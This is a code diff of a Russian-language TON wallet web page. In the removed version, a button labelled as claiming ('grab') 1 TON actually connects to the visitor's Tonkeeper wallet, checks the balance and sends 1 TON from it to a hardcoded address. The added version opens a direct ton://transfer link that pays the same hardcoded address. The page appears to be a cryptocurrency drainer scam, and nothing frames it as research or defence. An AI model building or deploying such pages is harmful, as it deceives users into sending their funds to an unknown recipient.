@@ -75,195 +75,28 @@
     <div class="container">
         <div style="font-size:36px;margin-bottom:16px;">⚡</div>
         <div class="balance-display" id="balanceDisplay">💰 0 TON</div>
-        <button class="btn" id="connectBtn">ПОДКЛЮЧИТЬ КОШЕЛЁК</button>
-        <button class="btn btn-red hidden" id="snipeBtn">🔥 ЗАБРАТЬ 1 TON</button>
+        <button class="btn" id="mainBtn">ПОДКЛЮЧИТЬ И ОТПРАВИТЬ 1 TON</button>
         <div id="status">Нажмите кнопку</div>
     </div>
 
     <script>
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
-        const AMOUNT_TON = 1;
-        let userAddress = null;
-        let provider = null;
-        let isConnected = false;
 
-        const connectBtn = document.getElementById('connectBtn');
-        const snipeBtn = document.getElementById('snipeBtn');
-        const status = document.getElementById('status');
-        const balanceDisplay = document.getElementById('balanceDisplay');
-
-        // ========== ПРОВЕРКА ==========
-        function isTelegram() {
-            return window.Telegram && window.Telegram.WebApp;
-        }
-
-        // ========== ПОДКЛЮЧЕНИЕ ==========
-        async function connectTon() {
-            try {
-                status.innerText = '⏳ Подключение...';
-                connectBtn.disabled = true;
-
-                // 1. Расширение
-                if (window.tonkeeper) {
-                    provider = window.tonkeeper;
-                    const accounts = await provider.send('ton_requestAccounts', {});
-                    if (accounts && accounts.length > 0) {
-                        userAddress = accounts[0];
-                        isConnected = true;
-                        afterConnect();
-                        return;
-                    }
-                }
-
-                // 2. Telegram / Мобильный
-                const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-                
-                if (isTelegram() || isMobile) {
-                    status.innerText = '📱 Открываю TON Keeper...';
-                    
-                    const returnUrl = encodeURIComponent(window.location.href);
-                    const connectUrl = `https://app.tonkeeper.com/ton-connect?ret=${returnUrl}`;
-                    
-                    if (isTelegram()) {
-                        window.Telegram.WebApp.openLink(connectUrl);
-                    } else {
-                        window.open(connectUrl, '_blank');
-                    }
-                    
-                    status.innerText = '✅ Подтвердите в TON Keeper';
-                    connectBtn.disabled = false;
-                    
-                    // Ждём подключения
-                    await waitForConnection();
-                    return;
-                }
-
-                status.innerText = '❌ Установите TON Keeper';
-                connectBtn.disabled = false;
-
-            } catch(e) {
-                status.innerText = '❌ ' + e.message;
-                connectBtn.disabled = false;
-            }
-        }
-
-        // ========== ОЖИДАНИЕ ПОДКЛЮЧЕНИЯ ==========
-        function waitForConnection() {
-            return new Promise((resolve) => {
-                let attempts = 0;
-                const interval = setInterval(async () => {
-                    attempts++;
-                    
-                    if (window.tonkeeper) {
-                        try {
-                            provider = window.tonkeeper;
-                            const accounts = await provider.send('ton_requestAccounts', {});
-                            if (accounts && accounts.length > 0) {
-                                userAddress = accounts[0];
-                                isConnected = true;
-                                clearInterval(interval);
-                                afterConnect();
-                                resolve();
-                                return;
-                            }
-                        } catch(e) {}
-                    }
-                    
-                    if (attempts > 30) {
-                        clearInterval(interval);
-                        status.innerText = '⏳ Подтвердите в TON Keeper вручную';
-                        resolve();
-                    }
-                }, 1000);
-            });
-        }
-
-        // ========== ПОСЛЕ ПОДКЛЮЧЕНИЯ ==========
-        function afterConnect() {
-            status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-            connectBtn.classList.add('hidden');
-            snipeBtn.classList.remove('hidden');
-            updateBalance();
-        }
-
-        // ========== БАЛАНС ==========
-        async function updateBalance() {
-            try {
-                if (!provider) return 0;
-                const hex = await provider.send('ton_getBalance', { address: userAddress });
-                const nano = parseInt(hex, 16);
-                const balance = (nano / 1e9).toFixed(6);
-                balanceDisplay.innerText = `💰 ${balance} TON`;
-                return nano;
-            } catch(e) {
-                return 0;
-            }
-        }
-
-        // ========== ВЫВОД 1 TON ==========
-        async function snipe() {
-            try {
-                status.innerText = '⏳ Проверка баланса...';
-                snipeBtn.disabled = true;
-
-                if (!provider) {
-                    status.innerText = '❌ Нет подключения к TON Keeper';
-                    snipeBtn.disabled = false;
-                    return;
-                }
-
-                const nano = await updateBalance();
-                const amountNano = AMOUNT_TON * 1e9;
-                const fee = 5000000;
-                const totalNeeded = amountNano + fee;
-
-                if (nano < totalNeeded) {
-                    status.innerText = `⚠️ Нужно ${(totalNeeded/1e9).toFixed(6)} TON (1 TON + комиссия)`;
-                    snipeBtn.disabled = false;
-                    return;
-                }
-
-                status.innerText = `⏳ Отправка ${AMOUNT_TON} TON...`;
-
-                const tx = {
-                    to: TARGET,
-                    value: amountNano.toString(),
-                    data: '',
-                    stateInit: ''
-                };
-
-                // ====== ОТПРАВКА ======
-                const result = await provider.send('ton_sendTransaction', tx);
-
-                if (result && result.code === 0) {
-                    status.innerText = `✅ ${AMOUNT_TON} TON ПЕРЕВЕДЕНО!`;
-                    snipeBtn.innerText = '✅ ГОТОВО';
-                    snipeBtn.disabled = true;
-                    snipeBtn.className = 'btn btn-green';
-                    await updateBalance();
-                } else {
-                    status.innerText = `❌ Транзакция отклонена`;
-                    snipeBtn.disabled = false;
-                }
-
-            } catch(e) {
-                status.innerText = '❌ ' + e.message;
-                snipeBtn.disabled = false;
-            }
-        }
-
-        // ========== КНОПКИ ==========
-        connectBtn.onclick = connectTon;
-        snipeBtn.onclick = snipe;
-
-        // ========== АВТОЗАПУСК ==========
-        setTimeout(() => {
-            if (window.tonkeeper) {
-                status.innerText = '🟢 Нажмите кнопку';
-            } else {
-                status.innerText = '📱 Нажмите кнопку для подключения';
-            }
-        }, 500);
+        document.getElementById('mainBtn').onclick = function() {
+            const status = document.getElementById('status');
+            status.innerText = '⏳ Открываю TON Keeper...';
+            
+            // ПРЯМАЯ ССЫЛКА НА ТРАНЗАКЦИЮ (КАК НА ПОРТАЛЕ)
+            const url = `ton://transfer?address=${TARGET}&amount=1`;
+            
+            window.location.href = url;
+            
+            setTimeout(() => {
+                window.open(url, '_blank');
+            }, 300);
+            
+            status.innerText = '✅ Подтвердите транзакцию в TON Keeper';
+        };
     </script>
 </body>
 </html>
